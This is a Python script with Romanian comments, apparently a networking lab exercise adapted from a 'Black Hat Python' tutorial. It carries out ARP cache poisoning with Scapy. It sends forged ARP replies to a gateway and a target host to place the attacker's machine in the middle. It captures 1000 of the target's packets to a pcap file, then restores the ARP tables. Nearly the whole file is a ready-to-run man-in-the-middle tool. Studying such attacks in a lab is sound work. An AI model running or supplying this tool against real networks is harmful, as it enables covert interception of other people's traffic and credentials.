# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

import signal
from scapy.all import *
from scapy.layers.l2 import ARP

# Parametrii procesului ARP spoofing
gateway_ip = "198.7.0.1"    # ip router
target_ip = "198.7.0.2"     # ip server
packet_count = 1000         # numarul de pachete care vor fi capturate in timpul atacului
conf.iface = "eth0"         # stabilirea interfetei de retea pe care va fi realizat atacul ARP
conf.verb = 0               # nu se vor afișa mesaje detaliate despre trimiterea sau recepționarea pachetelor


# Obținerea unei adrese MAC de la un IP dat.
# Vom trimite un ARP Request catre celelalte dispozitive pentru adresa IP dată
# Ar trebui sa primim un ARP reply cu adresa MAC corespunzătoare
def get_mac(ip_address):
    # Se construiește un ARP Request, utilizând funcția sr() din biblioteca Scapy pentru a trimite request-ul si a primi răspunsurile
    # Metoda alternativa: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    
    # resp conține pachetele ARP primite ca răspuns, iar unans conține pachetele care nu au primit răspuns
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc # dorim să obținem adresa MAC, care este stocată în câmpul hwsrc al pachetului ARP primit
    return None


# Vom restauram reteaua prin inversarea atacului ARP,
# trimitand un ARP reply cu adresele corecte
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    # valoarea "ff:ff:ff:ff:ff:ff" indică faptul că pachetul ARP va fi trimis tuturor dispozitivelor din rețea
    # prin setarea hwdst la adresa MAC de broadcast, se asigură că pachetul ARP ajunge la toate dispozitivele din rețea, inclusiv gateway-ul și dispozitivul țintă
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print(" Disabling IP forwarding")
    # Dezactivarea IP Forwarding pe os
    os.system("sysctl -w net.ipv4.ip_forward=0")
    # Oprirea procesului curent
    os.kill(os.getpid(), signal.SIGTERM)


# Continuam cu trimiterea de raspunsuri ARP false pentru a pune dispozitivul nostru in mijloc si sa intercepteze pachete
# Vom folosi adresa MAC a interfetei noastre drept hwsrc (adresa MAC sursa) pentru raspunsul ARP
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
#     modificare facuta aici
    global our_MAC
    our_MAC = get_mac("198.7.0.3")
    
    print(" Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            # trimitem un ARP Reply către gateway, astfel încât gateway-ul să creadă că adresa MAC 
            # asociată cu adresa IP 'target_ip' este adresa MAC a dispozitivului nostru
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=our_MAC, psrc=target_ip))
            
            # trimitem un ARP Reply către dispozitivul țintă, astfel încât acesta să creadă că adresa MAC 
            # asociată cu adresa IP gateway_ip este adresa MAC a dispozitivului nostru
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc=our_MAC, psrc=gateway_ip))
            
            # întârziere de 2 secunde între trimiterea pachetelor pentru a controla viteza atacului
            # pentru a nu face flood de pachete
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(" Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


def main():
    
    print(f" Gateway IP address: {gateway_ip}")
    print(f" Target IP address: {target_ip}")

    # obținem adresa MAC asociată adresei IP a gateway-ului.
    gateway_mac = get_mac(gateway_ip) 
    if gateway_mac is None:
        print(" Unable to get the gateway MAC address. Ending the execution of the program.")
        sys.exit(0)
    else:
        print(f" Gateway MAC address: {gateway_mac}")

    # obținem adresa MAC asociată adresei IP a dispozitivului țintă.
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(" Unable to get target MAC address. Ending the execution of the program.")
        sys.exit(0)
    else:
        print(f" Target MAC address: {target_mac}")

    #inițializarea thread-ului care rulează funcția arp_poison cu parametrii corespunzători
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    # capturăm pachetele rețelei filtrate după adresa IP a dispozitivului țintă si salvam intr-un fisier
    try:
        sniff_filter = "ip host " + target_ip   # filtru -> vom captura doar pachetele care au adresa IP sursă sau destinație egală cu adresa IP a dispozitivului țintă
        print(f" Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
        packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)  # captura efectivă a pachetelor de rețea 
        wrpcap(target_ip + "_capture.pcap", packets) # salvarea pachetelor capturate într-un fișier pcap
        print(f" Stopping network capture..Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac) # restabilirea configurației rețelei, inversând atacul ARP și trimitând pachete ARP corecte
    except KeyboardInterrupt:
        print(f" Stopping network capture..Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)
        
if __name__ == "__main__":
    main()
